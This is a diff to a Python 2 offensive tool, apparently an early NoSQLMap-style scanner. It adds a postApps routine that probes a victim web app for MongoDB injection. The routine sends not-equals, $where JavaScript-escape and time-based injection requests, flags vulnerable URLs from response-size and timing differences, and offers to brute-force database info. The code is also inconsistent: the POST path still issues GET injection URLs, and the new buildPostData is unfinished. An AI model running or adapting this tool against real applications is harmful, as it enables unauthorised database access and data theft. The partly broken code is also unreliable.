@@ -21,6 +21,7 @@ import os
 import time
 import httplib2
 import urllib
+import urllib2
 import pymongo
 import subprocess
 import json
@@ -80,7 +81,11 @@ def mainMenu():
 		elif select == "3":
 			#Check minimum required options
 			if (optionSet[0] == True) and (optionSet[2] == True):	
-				webApps()
+				if httpMethod == "GET":
+					webApps()
+				
+				else:
+					postApps()
 			
 			else:
 				raw_input("Options not set! Check Host and URI path.  Press enter to continue...")
@@ -102,6 +107,7 @@ def options():
 	global webPort
 	global uri
 	global httpMethod
+	global postData
 	global myIP
 	global myPort
 	#Set default value if needed
@@ -483,7 +489,331 @@ def netAttacks(target):
 	raw_input("Press enter to continue...")
 	return()
 		
+
+def postApps():
+	print "Web App Attacks"
+	print "==============="
+	paramName = []
+	paramValue = []
+	vulnAddrs = []
+	possAddrs = []
+	timeVulnsStr = []
+	timeVulnsInt = []
+	appUp = False
+	strTbAttack = False
+	intTbAttack = False
+	trueStr = False
+	trueInt = False
+	lt24 = False
+	global postData
 	
+	#Verify app is working.  
+	print "Checking to see if site at " + str(victim) + ":" + str(webPort) + str(uri) + " is up..."
+	
+	appURL = "http://" + str(victim) + ":" + str(webPort) + str(uri)
+	
+	try:
+		body = urllib.urlencode(postData)
+		req = urllib2.Request(appURL,body)
+		appRespCode = urllib2.urlopen(req).getcode()
+		
+		#normLength = int(len(urllib.urlopen(appURL).read()))
+		if appRespCode == 200:
+			
+			normLength = int(len(urllib2.urlopen(req).read()))
+			timeReq = urllib2.urlopen(req)
+			start = time.time()
+			page = timeReq.read()
+			end = time.time()
+			timeReq.close()
+			timeBase = round((end - start), 3)
+			
+			
+			
+			print "App is up! Got response length of " + str(normLength) + " and response time of " + str(timeBase) + " seconds.  Starting injection test.\n"
+			appUp = True
+		
+		else:
+			print "Got " + appRespCode + "from the app, check your options."
+	except:
+		print sys.exc_info()
+		print "Looks like the server didn't respond.  Check your options."
+	
+	if appUp == True:
+			
+		injectSize = raw_input("Baseline test-Enter random string size: ")
+		injectString = randInjString(int(injectSize))
+		print "Using " + injectString + " for injection testing.\n"
+		
+		#Build a random string and insert; if the app handles input correctly, a random string and injected code should be treated the same.
+		#Add error handling for Non-200 HTTP response codes if random strings freaks out the app.
+		randomUri = buildUri(appURL,injectString)
+		print "Checking random injected parameter HTTP response size using " + randomUri +"...\n"
+		randLength = int(len(urllib.urlopen(randomUri).read()))
+		print "Got response length of " + str(randLength) + "."
+		
+		randNormDelta = abs(normLength - randLength)
+		
+		if randNormDelta == 0: 
+			print "No change in response size injecting a random parameter..\n"
+		else:
+			print "HTTP response varied " + str(randNormDelta) + " bytes with random parameter value!\n"
+			
+		print "Testing Mongo PHP not equals associative array injection using " + uriArray[1] +"..."
+		injLen = int(len(urllib.urlopen(uriArray[1]).read()))
+		print "Got response length of " + str(injLen) + "."
+		
+		randInjDelta = abs(injLen - randLength)
+		
+		if (randInjDelta >= 100) and (injLen != 0) :
+			print "Not equals injection response varied " + str(randInjDelta) + " bytes from random parameter value! Injection works!"
+			vulnAddrs.append(uriArray[1])
+		
+		elif (randInjDelta > 0) and (randInjDelta < 100) and (injLen != 0) :
+			print "Response variance was only " + str(randInjDelta) + " bytes. Injection might have worked but difference is too small to be certain. "
+			possAddrs.append(uriArray[1])
+		
+		elif (randInjDelta == 0):
+			print "Random string response size and not equals injection were the same. Injection did not work."
+		else:
+			print "Injected response was smaller than random response.  Injection may have worked but requires verification."
+			possAddrs.append(uriArray[1])
+		
+		print "Testing Mongo <2.4 $where all Javascript string escape attack for all records...\n"
+		print "Injecting " + uriArray[2]
+		
+		whereStrLen = int(len(urllib.urlopen(uriArray[2]).read()))
+		whereStrDelta = abs(whereStrLen - randLength)
+		
+		if (whereStrDelta >= 100) and (whereStrLen > 0):
+			print "Java $where escape varied " + str(whereStrDelta)  + " bytes from random parameter value! Where injection works!"
+			lt24 = True
+			str24 = True
+			vulnAddrs.append(uriArray[2])
+		
+		elif (whereStrDelta > 0) and (whereStrDelta < 100) and (whereStrLen - randLength > 0):
+			print " response variance was only " + str(whereStrDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
+			possAddrs.append(uriArray[2])
+			
+		elif (whereStrDelta == 0):
+			print "Random string response size and $where injection were the same. Injection did not work."
+		
+		else:
+			print "Injected response was smaller than random response.  Injection may have worked but requires verification."
+			possAddrs.append(uriArray[2])
+		
+		print "\n"
+		print "Testing Mongo <2.4 $where Javascript integer escape attack for all records...\n"
+		print "Injecting " + uriArray[3]
+		
+		whereIntLen = int(len(urllib.urlopen(uriArray[3]).read()))
+		whereIntDelta = abs(whereIntLen - randLength)
+		
+		if (whereIntDelta >= 100) and (whereIntLen - randLength > 0):
+			print "Java $where escape varied " + str(whereIntDelta)  + " bytes from random parameter! Where injection works!"
+			lt24 = True
+			int24 = True
+			vulnAddrs.append(uriArray[3])
+			
+		elif (whereIntDelta > 0) and (whereIntDelta < 100) and (whereIntLen - randLength > 0):
+			print " response variance was only " + str(whereIntDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
+			possAddrs.append(uriArray[3])
+			
+		elif (whereIntDelta == 0):
+			print "Random string response size and $where injection were the same. Injection did not work."
+		
+		else:
+			print "Injected response was smaller than random response.  Injection may have worked but requires verification."
+			possAddrs.append(uriArray[3])
+			
+		#Start a single record attack in case the app expects only one record back
+		
+		print "Testing Mongo <2.4 $where all Javascript string escape attack for one record...\n"
+		print " Injecting " + uriArray[4]
+		
+		
+		whereOneStrLen = int(len(urllib.urlopen(uriArray[4]).read()))
+		whereOneStrDelta = abs(whereOneStrLen - randLength)
+			
+		if (whereOneStrDelta >= 100) and (whereOneStrLen - randLength > 0):
+			print "Java $where escape varied " + str(whereOneStrDelta)  + " bytes from random parameter value! Where injection works!"
+			lt24 = True
+			str24 = True
+			vulnAddrs.append(uriArray[4])
+		
+		elif (whereOneStrDelta > 0) and (whereOneStrDelta < 100) and (whereOneStrLen - randLength > 0):
+			print " response variance was only " + str(whereOneStrDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
+			possAddrs.append(uriArray[4])
+			
+		elif (whereOneStrDelta == 0):
+			print "Random string response size and $where single injection were the same. Injection did not work."
+		
+		else:
+			print "Injected response was smaller than random response.  Injection may have worked but requires verification."
+			possAddrs.append(uriArray[4])
+			
+		print "\n"
+		print "Testing Mongo <2.4 $where Javascript integer escape attack for one record...\n"
+		print " Injecting " + uriArray[5]
+		
+		
+		whereOneIntLen = int(len(urllib.urlopen(uriArray[5]).read()))
+		whereOneIntDelta = abs(whereOneIntLen - randLength)				
+			
+		if (whereOneIntDelta >= 100) and (whereOneIntLen - randLength > 0):
+			print "Java $where escape varied " + str(whereOneIntDelta)  + " bytes from random parameter! Where injection works!"
+			lt24 = True
+			int24 = True
+			vulnAddrs.append(uriArray[5])
+		
+		elif (whereOneIntDelta > 0) and (whereOneIntDelta < 100) and (whereOneIntLen - randLength > 0):
+			print " response variance was only " + str(whereOneIntDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
+			possAddrs.append(uriArray[5])
+			
+		elif (whereOneIntDelta == 0):
+			print "Random string response size and $where single record injection were the same. Injection did not work."
+			
+		else:	
+			print "Injected response was smaller than random response.  Injection may have worked but requires verification."								
+			possAddrs.append(uriArray[5])
+			
+		print "\n"
+		print "Testing Mongo this not equals string escape attack for all records..."
+		print " Injecting " + uriArray[8]
+		
+		whereThisStrLen = int(len(urllib.urlopen(uriArray[8]).read()))
+		whereThisStrDelta = abs(whereThisStrLen - randLength)
+		
+		if (whereThisStrDelta >= 100) and (whereThisStrLen - randLength > 0):
+			print "Java this not equals varied " + str(whereThisStrDelta)  + " bytes from random parameter! Where injection works!"
+			vulnAddrs.append(uriArray[8])
+		
+		elif (whereThisStrDelta > 0) and (whereThisStrDelta < 100) and (whereThisStrLen - randLength > 0):
+			print " response variance was only " + str(whereThisStrDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
+			possAddrs.append(uriArray[8])
+			
+		elif (whereThisStrDelta == 0):
+			print "Random string response size and this return response size were the same. Injection did not work."
+			
+		else:	
+			print "Injected response was smaller than random response.  Injection may have worked but requires verification."								
+			possAddrs.append(uriArray[8])
+			
+		print "\n"
+		print "Testing Mongo this not equals integer escape attack for all records..."
+		print " Injecting " + uriArray[9]
+		
+		whereThisIntLen = int(len(urllib.urlopen(uriArray[9]).read()))
+		whereThisIntDelta = abs(whereThisIntLen - randLength)
+		
+		if (whereThisIntDelta >= 100) and (whereThisIntLen - randLength > 0):
+			print "Java this not equals varied " + str(whereThisStrDelta)  + " bytes from random parameter! Where injection works!"
+			vulnAddrs.append(uriArray[9])
+		
+		elif (whereThisIntDelta > 0) and (whereThisIntDelta < 100) and (whereThisIntLen - randLength > 0):
+			print " response variance was only " + str(whereThisIntDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
+			possAddrs.append(uriArray[9])
+			
+		elif (whereThisIntDelta == 0):
+			print "Random string response size and this return response size were the same. Injection did not work."
+			
+		else:	
+			print "Injected response was smaller than random response.  Injection may have worked but requires verification."								
+			possAddrs.append(uriArray[9])
+			
+		print "\n"
+		doTimeAttack = raw_input("Start timing based tests (y/n)? ")
+		
+		if doTimeAttack == "y" or doTimeAttack == "Y":
+			print "Starting Javascript string escape time based injection..."
+			start = time.time()
+			strTimeInj = urllib.urlopen(uriArray[6])
+			page = strTimeInj.read()
+			end = time.time()
+			strTimeInj.close()
+			#print str(end)
+			#print str(start)
+			strTimeDelta = (int(round((end - start), 3)) - timeBase)
+			#print str(strTimeDelta)
+			if strTimeDelta > 25:
+				print "HTTP load time variance was " + str(strTimeDelta) +" seconds! Injection possible."
+				strTbAttack = True
+			
+			else:
+				print "HTTP load time variance was only " + str(strTimeDelta) + ".  Injection probably didn't work."
+				strTbAttack = False
+			
+			print "Starting Javascript integer escape time based injection..."
+			start = time.time()
+			intTimeInj = urllib.urlopen(uriArray[7])
+			page = intTimeInj.read()
+			end = time.time()
+			intTimeInj.close()
+			#print str(end)
+			#print str(start)
+			intTimeDelta = (int(round((end - start), 3)) - timeBase)
+			#print str(strTimeDelta)
+			if intTimeDelta > 25:
+				print "HTTP load time variance was " + str(intTimeDelta) +" seconds! Injection possible."
+				intTbAttack = True
+			
+			else:
+				print "HTTP load time variance was only " + str(intTimeDelta) + "seconds.  Injection probably didn't work."
+				intTbAttack = False
+		
+		if lt24 == True:
+			bfInfo = raw_input("MongoDB < 2.4 detected.  Start brute forcing database info (y/n)? ")
+			
+			if bfInfo == "y" or bfInfo == "Y":
+				getDBInfo()
+				
+		
+		print "\n"	
+		print "Vunerable URLs:"
+		print "\n".join(vulnAddrs)
+		print "\n"
+		print "Possibly vulnerable URLs:"
+		print"\n".join(possAddrs)
+		print "\n"
+		print "Timing based attacks:"
+		
+		if strTbAttack == True:
+			print "String attack-Successful"
+		else:
+			print "String attack-Unsuccessful"
+		if intTbAttack == True:
+			print "Integer attack-Successful"
+		else:
+			print "Integer attack-Unsuccessful"
+		
+		fileOut = raw_input("Save results to file (y/n)? ")
+		
+		if fileOut == "y" or fileOut == "Y":
+			savePath = raw_input("Enter output file name: ")
+			fo = open(savePath, "wb")
+			fo.write ("Vulnerable URLs:\n")
+			fo.write("\n".join(vulnAddrs))
+			fo.write("\n\n")
+			fo.write("Possibly Vulnerable URLs:\n")
+			fo.write("\n".join(possAddrs))
+			fo.write("\n")
+			fo.write("Timing based attacks:\n")
+			
+			if strTbAttack == True:
+				fo.write("String Attack-Successful\n")
+			else:
+				fo.write("String Attack-Unsuccessful\n")
+			fo.write("\n")
+			
+			if intTbAttack == True:
+				fo.write("Integer attack-Successful\n")
+			else:
+				fo.write("Integer attack-Unsuccessful\n")
+			fo.write("\n")
+			fo.close()
+		
+	raw_input("Press enter to continue...")
+	return()	
 	
 def webApps():
 	print "Web App Attacks"
@@ -969,7 +1299,28 @@ def buildUri(origUri, randValue):
 	return uriArray[0]
 
 def buildPostData(body):
-	print "Post data crap goes here."
+	global bodyArray
+	bodyArray = ["","","","","","","","","","","","","","","","","",""]
+	injOpt = ""
+	
+	#Split the string between the path and parameters, and then split each parameter
+		
+		
+	menuItem = 1
+	print "List of parameters:"
+	for params in body.keys():
+		print str(menuItem) + "-" + params
+		menuItem += 1
+	
+	try:
+		injIndex = raw_input("Which parameter should we inject? ")
+		injOpt = str(body.keys()[int(injIndex)-1])
+		print "Injecting the " + injOpt + " parameter..."
+	except:
+		raw_input("Something went wrong.  Press enter to return to the main menu...")
+		mainMenu()
+	
+	
 	
 def stealDBs(myDB):
 	menuItem = 1	
